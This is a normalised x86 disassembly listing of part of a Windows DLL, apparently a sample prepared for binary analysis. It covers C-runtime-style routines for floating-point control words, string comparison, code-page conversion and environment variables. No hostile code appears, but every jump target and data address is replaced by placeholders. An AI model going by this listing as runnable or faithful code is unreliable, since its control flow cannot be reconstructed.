inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_10036a95
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_10036b23
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_10036bc3
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_10036a95
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_10036b23
push eax
mov [ ebp - 0xc ] eax
call sub_100372f4
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_10036ed2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_100370a0
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10023358
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_10026ff4
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_10033a4d
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10037155
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100376f4
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037736
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003725d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_10026cea
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_100207fd
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_100378dc
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_100207fd
pop ecx
mov [ ebp - 0x4 ] esi
sub_100372f4
push 0x8
push r--data
call sub_10028b48
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_10028b8d
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_10037366
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_10037384
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_10037366
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_10037366
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_100301a0
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_100301e9
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_100207fd
push edi
call sub_100207fd
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_100301e9
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_100207fd
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_10026507
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_10022f32
pop ecx
test eax eax
je r-xdata
call sub_100303a0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_10026507
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_10022f32
pop ecx
test eax eax
je r-xdata
call sub_100303a0
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_100376f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10037384
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10037736
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_100376f4
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100338fd
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_10026065
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10037830
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_10037243
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_10037882
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_10026cea
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_10023708
jmp r-xdata
push eax
call sub_10037b27
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_100378dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10026065
mov [ eax ] 0x16
push 0x3d
push esi
call sub_10037c38
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_10037882
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_10037830
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_10026ca5
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1003725d
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_100207fd
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_100207fd
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_10026ca5
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_10026d84
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_10026d84
add esp 0xc
cmp eax ebx
je r-xdata
